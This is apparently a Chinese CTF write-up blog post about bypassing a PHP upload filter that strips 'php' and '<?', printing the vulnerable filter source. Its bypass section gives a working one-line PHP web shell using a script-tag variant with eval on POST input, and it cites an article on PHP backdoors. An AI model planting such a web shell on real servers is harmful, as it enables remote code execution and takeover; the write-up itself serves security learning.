---
title: WebUpload
date: 2018-02-02 00:00:00
categories:
- CTF/Web
tags: 百度杯九月 php黑魔法
---

## 随意上传

- 不会更改文件名
- 针对文件内容有过滤
    - php
    - <?

## php可被解析的四种格式

- `<?php echo 1;?>`
- `<? echo 1;?>`
- `＜script language="php"＞echo 1;＜/script＞`
- `<% echo 1; %>`

## 绕过
```php
<script language="pHP">@eval($_POST['a']);</script> 
```


## 过滤源码分析

```php

<?php
  if($_SERVER["REQUEST_METHOD"] === "POST") :
?>
<?php
    if (is_uploaded_file($_FILES["file"]["tmp_name"])):
      $file = $_FILES['file'];
      $name = $file['name'];
      if (preg_match("/^[a-zA-Z0-9]+\\.[a-zA-Z0-9]+$/", $name) ):
        $data = file_get_contents($file['tmp_name']);
        while($next = preg_replace("/<\\?/", "", $data)){
          $next = preg_replace("/php/", "", $next);
          if($data === $next) break;
          $data = $next;
        }
        file_put_contents(dirname(__FILE__) . '/u/' . $name, $data);
        chmod(dirname(__FILE__) . '/u/' . $name, 0644);
?>
        <div>
          <a href="<?php echo htmlspecialchars("u/" . $name)?>">上传成功!</a>
        </div>
<?php
      endif;
    endif;
?>
<?php
  endif;
?>
```

## 参考

> 那些强悍的PHP一句话后门   
>[http://netsecurity.51cto.com/art/201305/393110_2.htm](http://netsecurity.51cto.com/art/201305/393110_2.htm)